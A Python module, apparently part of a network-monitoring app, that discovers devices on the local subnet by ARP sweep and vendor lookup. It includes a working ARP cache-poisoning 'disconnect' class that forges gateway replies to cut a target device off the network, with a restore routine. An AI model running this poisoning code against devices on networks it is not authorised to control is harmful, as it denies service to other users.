"""
Network Device Discovery & Local Control.

Discovers every device answering ARP on the local subnet (same technique a
router's "connected devices" page uses), and offers two ways to cut a
device's connectivity once you've identified it:

  - Firewall disconnect: blocks that IP from communicating with THIS PC
    only (both directions). Safe, instant, fully reversible, no effect on
    the device's access to the rest of the network.

  - ARP disconnect: continuously poisons the target's ARP cache so it loses
    its route to the gateway, cutting its LAN/internet access network-wide
    -- not just from this PC. This is the same technique the ARP-spoofing
    detector elsewhere in this app flags as an attack when someone else does
    it to you. Only use it against devices you own or are authorised to
    test on your own network; it requires the same raw-packet/admin access
    the rest of the app's live capture already needs.

Both actions are local-network only by construction -- ARP doesn't route
past your own gateway, so neither mechanism can reach outside your LAN.
"""
from __future__ import annotations

import socket
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Callable, Optional

try:
    from scapy.all import ARP, Ether, conf, get_if_addr, get_if_hwaddr, send, srp
    _SCAPY_OK = True
except ImportError:
    _SCAPY_OK = False

try:
    import psutil
    _PSUTIL_OK = True
except ImportError:
    _PSUTIL_OK = False

import requests

_ARP_TIMEOUT      = 2.0     # seconds to wait for ARP replies during a sweep
_POISON_INTERVAL  = 1.5     # seconds between repeated poison packets
_RESTORE_PACKETS  = 4       # corrective ARP packets sent on reconnect
_MAX_SCAN_ADDRESSES = 1024  # cap a sweep to roughly a /22; narrow to /24 beyond this

# A short table of common OUI prefixes so vendor lookup works even with no
# network access; the online lookup (api.macvendors.com) is tried first and
# this is the fallback, not the other way around.
_OUI_FALLBACK = {
    "00:1A:11": "Google", "F4:F5:D8": "Google", "3C:5A:B4": "Google",
    "AC:DE:48": "Apple", "F0:18:98": "Apple", "A4:C3:61": "Apple", "DC:A9:04": "Apple",
    "B8:27:EB": "Raspberry Pi Foundation", "DC:A6:32": "Raspberry Pi Foundation",
    "00:50:56": "VMware", "08:00:27": "Oracle VirtualBox",
    "00:1B:63": "Netgear", "20:E5:2A": "Netgear", "9C:3D:CF": "TP-Link",
    "00:0C:29": "VMware", "00:1C:42": "Parallels",
    "3C:28:6D": "Huawei", "48:A4:72": "Huawei",
    "F8:0F:41": "Samsung Electronics", "5C:0A:5B": "Samsung Electronics",
    "00:16:3E": "Xensource",
}


@dataclass
class Device:
    ip:         str
    mac:        str
    hostname:   str = ""
    vendor:     str = ""
    is_self:    bool = False
    is_gateway: bool = False
    blocked:    bool = False     # firewall (this-PC-only) block active
    disconnected: bool = False   # ARP disconnect active
    last_seen:  str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))

    @property
    def role(self) -> str:
        if self.is_self:
            return "This PC"
        if self.is_gateway:
            return "Router / Gateway"
        return ""


# ══════════════════════════════════════════════════════════════════════════════
# ── Discovery ─────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class NetworkDeviceScanner:
    """Active ARP sweep of the local subnet, plus on-request hostname/vendor
    lookups so the initial scan stays fast."""

    def __init__(self, gateway_ip: str = ""):
        self._gateway_ip   = gateway_ip
        self._vendor_cache: dict[str, str] = {}
        self._hostname_cache: dict[str, str] = {}

    # ── Subnet detection ────────────────────────────────────────────────────

    def local_network_info(self) -> Optional[dict]:
        """Returns {iface, ip, mac, netmask, gateway_ip} for the active LAN
        adapter, or None if it can't be determined."""
        if not _SCAPY_OK:
            return None
        try:
            iface = conf.iface
            ip    = get_if_addr(iface)
            mac   = get_if_hwaddr(iface)
            if not ip or ip == "0.0.0.0":
                return None
            netmask = "255.255.255.0"
            if _PSUTIL_OK:
                for _, addrs in psutil.net_if_addrs().items():
                    for a in addrs:
                        if getattr(a, "address", None) == ip and getattr(a, "netmask", None):
                            netmask = a.netmask
                            break
            return {
                "iface": iface, "ip": ip, "mac": mac,
                "netmask": netmask, "gateway_ip": self._gateway_ip,
            }
        except Exception:
            return None

    @staticmethod
    def _cidr_from_netmask(ip: str, netmask: str) -> str:
        import ipaddress
        iface = ipaddress.ip_interface(f"{ip}/{netmask}")
        return str(iface.network)

    # ── Scan ─────────────────────────────────────────────────────────────────

    def scan(self, on_progress: Optional[Callable[[str], None]] = None) -> list[Device]:
        """Active ARP sweep. Fast -- only resolves IP + MAC; call
        enrich() per-device afterwards for hostname/vendor on request."""
        progress = on_progress or (lambda _msg: None)
        if not _SCAPY_OK:
            progress("Scapy not available — cannot scan.")
            return []

        info = self.local_network_info()
        if not info:
            progress("Could not determine local network — is a NIC connected?")
            return []

        network = self._cidr_from_netmask(info["ip"], info["netmask"])
        import ipaddress
        net_obj = ipaddress.ip_network(network)
        if net_obj.num_addresses > _MAX_SCAN_ADDRESSES:
            # Some networks (school/corporate VLANs especially) report a far
            # bigger subnet than is practical to ARP-sweep -- a /18 is 262,144
            # addresses and would hang for a very long time. Narrow to the /24
            # around this host's own IP, which is what's actually "my network"
            # in practice regardless of the VLAN-wide netmask.
            narrowed = ipaddress.ip_interface(f"{info['ip']}/24").network
            progress(f"Reported subnet {network} is too large to sweep "
                     f"({net_obj.num_addresses:,} addresses) — scanning the "
                     f"local {narrowed} instead.")
            network = str(narrowed)
        else:
            progress(f"Scanning {network} via ARP…")

        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
            answered, _ = srp(pkt, timeout=_ARP_TIMEOUT, verbose=False, iface=info["iface"])
        except Exception as e:
            progress(f"Scan failed: {e}")
            return []

        devices: list[Device] = []
        my_ip, my_mac = info["ip"], info["mac"].lower()
        gw_ip = info.get("gateway_ip") or ""

        for _, r in answered:
            ip  = r.psrc
            mac = r.hwsrc.lower()
            devices.append(Device(
                ip=ip, mac=mac,
                is_self=(ip == my_ip or mac == my_mac),
                is_gateway=(bool(gw_ip) and ip == gw_ip),
            ))

        # Make sure this PC is always listed even if it didn't answer its own ARP sweep
        if not any(d.is_self for d in devices):
            devices.append(Device(ip=my_ip, mac=my_mac, is_self=True))

        devices.sort(key=lambda d: tuple(int(p) for p in d.ip.split(".")))
        progress(f"Found {len(devices)} device(s).")
        return devices

    # ── On-request enrichment ───────────────────────────────────────────────

    def resolve_hostname(self, ip: str) -> str:
        if ip in self._hostname_cache:
            return self._hostname_cache[ip]
        try:
            name = socket.gethostbyaddr(ip)[0]
        except Exception:
            name = ""
        self._hostname_cache[ip] = name
        return name

    def resolve_vendor(self, mac: str) -> str:
        if mac in self._vendor_cache:
            return self._vendor_cache[mac]
        prefix = mac.upper()[0:8]
        vendor = ""
        try:
            r = requests.get(f"https://api.macvendors.com/{mac}", timeout=3)
            if r.status_code == 200 and r.text and "error" not in r.text.lower():
                vendor = r.text.strip()
        except Exception:
            pass
        if not vendor:
            vendor = _OUI_FALLBACK.get(prefix, "")
        self._vendor_cache[mac] = vendor
        return vendor

    def enrich(self, device: Device) -> Device:
        """Fill in hostname + vendor for one device. Call on request (e.g.
        when the user selects a row), not for the whole list at once."""
        device.hostname = self.resolve_hostname(device.ip)
        device.vendor   = self.resolve_vendor(device.mac)
        return device


# ══════════════════════════════════════════════════════════════════════════════
# ── ARP disconnect / reconnect ───────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class ARPDisconnector:
    """
    Cuts a target device off from the gateway by continuously sending it
    forged ARP replies claiming this machine is the gateway. The target's
    gateway-bound traffic then goes to us instead, and we simply don't
    forward it -- a one-way blackhole. stop() restores the real mapping.

    Needs the target's and gateway's real MACs (from a prior scan) and
    admin/Npcap, same as the rest of this app's live capture.
    """

    def __init__(
        self,
        target_ip: str, target_mac: str,
        gateway_ip: str, gateway_mac: str,
        on_event: Optional[Callable[[dict], None]] = None,
    ):
        self._target_ip   = target_ip
        self._target_mac  = target_mac
        self._gateway_ip  = gateway_ip
        self._gateway_mac = gateway_mac
        self._on_event     = on_event or (lambda _: None)
        self._my_mac       = get_if_hwaddr(conf.iface) if _SCAPY_OK else ""
        self._running      = False
        self._thread: Optional[threading.Thread] = None

    @property
    def target_ip(self) -> str:
        return self._target_ip

    def start(self) -> tuple[bool, str]:
        if not _SCAPY_OK:
            return False, "Scapy not available."
        if self._running:
            return False, "Already disconnecting this device."
        self._running = True
        self._thread = threading.Thread(target=self._run, daemon=True, name=f"ARPDisconnect-{self._target_ip}")
        self._thread.start()
        self._on_event({
            "rule_name": "Device Disconnected (ARP)",
            "severity":  "high",
            "source_ip": self._target_ip,
            "message":   f"{self._target_ip} cut off from the network (ARP) -- "
                         f"reconnect from the Network Devices tab when done.",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "category":  "network_control",
        })
        return True, f"Disconnecting {self._target_ip} from the network."

    def stop(self) -> tuple[bool, str]:
        if not self._running:
            return True, "Not currently disconnected."
        self._running = False
        if self._thread:
            self._thread.join(timeout=_POISON_INTERVAL + 2)
        self._restore()
        self._on_event({
            "rule_name": "Device Reconnected",
            "severity":  "low",
            "source_ip": self._target_ip,
            "message":   f"{self._target_ip} reconnected -- real gateway route restored.",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "category":  "network_control",
        })
        return True, f"Reconnected {self._target_ip}."

    def is_running(self) -> bool:
        return self._running

    # ── Internal ────────────────────────────────────────────────────────────

    def _run(self) -> None:
        while self._running:
            try:
                self._poison_once()
            except Exception:
                pass
            time.sleep(_POISON_INTERVAL)

    def _poison_once(self) -> None:
        # Tell the target: "the gateway's IP is now at my MAC"
        send(ARP(op=2, pdst=self._target_ip, hwdst=self._target_mac,
                  psrc=self._gateway_ip, hwsrc=self._my_mac), verbose=False)

    def _restore(self) -> None:
        for _ in range(_RESTORE_PACKETS):
            try:
                # Tell the target the truth: gateway IP really is at the gateway's MAC
                send(ARP(op=2, pdst=self._target_ip, hwdst=self._target_mac,
                          psrc=self._gateway_ip, hwsrc=self._gateway_mac), verbose=False)
            except Exception:
                pass
            time.sleep(0.2)


class DeviceControlRegistry:
    """Tracks which devices currently have an active ARPDisconnector so the
    GUI can reflect state and a clean shutdown can restore everyone."""

    def __init__(self, on_event: Optional[Callable[[dict], None]] = None):
        self._on_event = on_event or (lambda _: None)
        self._active: dict[str, ARPDisconnector] = {}
        self._lock = threading.Lock()

    def disconnect(self, target_ip, target_mac, gateway_ip, gateway_mac) -> tuple[bool, str]:
        with self._lock:
            if target_ip in self._active:
                return False, f"{target_ip} is already disconnected."
            d = ARPDisconnector(target_ip, target_mac, gateway_ip, gateway_mac, on_event=self._on_event)
            ok, msg = d.start()
            if ok:
                self._active[target_ip] = d
            return ok, msg

    def reconnect(self, target_ip: str) -> tuple[bool, str]:
        with self._lock:
            d = self._active.pop(target_ip, None)
        if not d:
            return False, f"{target_ip} is not currently disconnected."
        return d.stop()

    def reconnect_all(self) -> None:
        with self._lock:
            items = list(self._active.items())
            self._active.clear()
        for _ip, d in items:
            try:
                d.stop()
            except Exception:
                pass

    def is_disconnected(self, ip: str) -> bool:
        with self._lock:
            return ip in self._active
